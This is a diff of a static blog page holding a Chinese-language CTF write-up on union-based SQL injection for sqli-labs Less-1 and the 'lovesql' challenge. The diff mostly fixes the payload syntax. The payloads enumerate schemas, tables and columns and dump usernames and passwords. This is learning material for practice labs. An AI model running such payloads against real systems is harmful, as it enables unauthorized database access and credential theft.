@@ -14,7 +14,7 @@
 <meta property="og:description" content="less1.判断是否存在注入?id&#x3D;1，存在回显，加上‘后回显错误，判断其是单引号字符型注入 后用order by语句判断有几列数据">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-11-17T07:29:24.000Z">
-<meta property="article:modified_time" content="2021-11-17T07:38:34.643Z">
+<meta property="article:modified_time" content="2021-11-17T10:44:14.820Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -102,19 +102,19 @@
 <p>UNION SELECT联合查询，在这改成id=-1，-1是数据库中不存在的，所以用union select查询后是否用回显位</p>
 <p>在这道题</p>
 <p>查库union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
-<p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table schema=0xsecurity–+</p>
-<p>查字段union select column_name from information_schema.columns where tables_name=0xusers</p>
-<p>查数据union select 1,2,group_concat(group_ws(‘~’,username,password)) from security.users–+<br>在这里使用hackbar转换表名为16进制，可以避免‘’的错误</p>
+<p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0xsecurity–+</p>
+<p>查字段union select column_name from information_schema.columns where table_name=0xusers</p>
+<p>查数据union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+<br>在这里使用hackbar转换表名为16进制，可以避免‘’的错误</p>
 <p>函数 </p>
 <p>1.group_concat直接查询所有的数据</p>
-<p>2.group_ws(‘<del>‘)将要查询的两个数据用</del>连接，与group_concat联合使用查询全部</p>
+<p>2.concat_ws(‘<del>‘)将要查询的两个数据用</del>连接，与group_concat联合使用查询全部</p>
 <h2 id="lovesql"><a href="#lovesql" class="headerlink" title="lovesql."></a>lovesql.</h2><p>与less1的做法大概相同。<br>判断需要#，order by，union<br>查库 select 1,database(),3# 得到username为geek<br>查表 select 1,2,group_concat(table_name) from infromation_schema.tables where table schema=database()#得到数据后<br>查字段 select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’#<br>查数据 select 1,2,group_concat(id,username,password) from l0ve1ysq1#</p>
 <p>而在这题好像只能在给出的两个输入框中输入，无法转换成16进制</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/17/less1-lovesql/" data-id="ckw37r4w10006toty8x52cw9q" data-title="less1,lovesql" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/11/17/less1-lovesql/" data-id="ckw3eea9x0006h8ty6wougz6q" data-title="less1,lovesql" class="article-share-link">Share</a>
       
       
       
